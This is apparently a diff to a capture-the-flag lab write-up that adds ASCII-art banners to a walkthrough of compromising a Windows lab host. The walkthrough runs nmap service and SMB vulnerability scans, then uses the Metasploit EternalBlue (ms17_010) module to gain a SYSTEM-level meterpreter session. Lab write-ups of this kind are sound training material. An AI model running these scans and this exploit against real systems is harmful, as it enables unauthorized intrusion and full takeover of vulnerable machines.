@@ -19,9 +19,14 @@ Command, Control, and Conquer
 ----Instead of using Armitage, I will be using Metasploit.
 ----(Armitage is the same thing, but with a GUI)
 
-Nmap scan:
+     __                         __                 
+  /\ \ \_ __ ___   __ _ _ __   / _\ ___ __ _ _ __  
+ /  \/ / '_ ` _ \ / _` | '_ \  \ \ / __/ _` | '_ \ 
+/ /\  /| | | | | | (_| | |_) | _\ \ (_| (_| | | | |
+\_\ \/ |_| |_| |_|\__,_| .__/  \__/\___\__,_|_| |_|
+                       |_| 
 
-nmap -sV -T4 10.10.58.17
+{{nmap -sV -T4 10.10.58.17}}
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-14 19:01 UTC
 Nmap scan report for 10.10.58.17
 Host is up (0.20s latency).
@@ -41,7 +46,7 @@ Service Info: Host: TEDS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 ----The room tells us we will be using Eternal Blue to exploit this, but if you want to see how you would confirm that it's vulnerable:
 
-nmap -p 139,445 --script smb-vuln* 10.10.58.17
+{{nmap -p 139,445 --script smb-vuln* 10.10.58.17}}
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-14 19:07 UTC
 Nmap scan report for 10.10.58.17
 Host is up (0.31s latency).
@@ -70,9 +75,16 @@ Host script results:
 
 Nmap done: 1 IP address (1 host up) scanned in 10.11 seconds
 
+      _                        _   _     _            
+  ___| |_ ___ _ __ _ __   __ _| | | |__ | |_   _  ___ 
+ / _ \ __/ _ \ '__| '_ \ / _` | | | '_ \| | | | |/ _ \
+|  __/ ||  __/ |  | | | | (_| | | | |_) | | |_| |  __/
+ \___|\__\___|_|  |_| |_|\__,_|_| |_.__/|_|\__,_|\___|
+                                                      
+
 ----Next, start Metasploit:
 
-msfconsole
+{{msfconsole}}
 
 ----And search for the exploit:
 
@@ -186,6 +198,13 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
+
+  __ _                 
+ / _| | __ _  __ _ ___ 
+| |_| |/ _` |/ _` / __|
+|  _| | (_| | (_| \__ \
+|_| |_|\__,_|\__, |___/
+             |___/     
 
 ----We have successfully exploited the system. Drop into a shell with the command "shell".
 
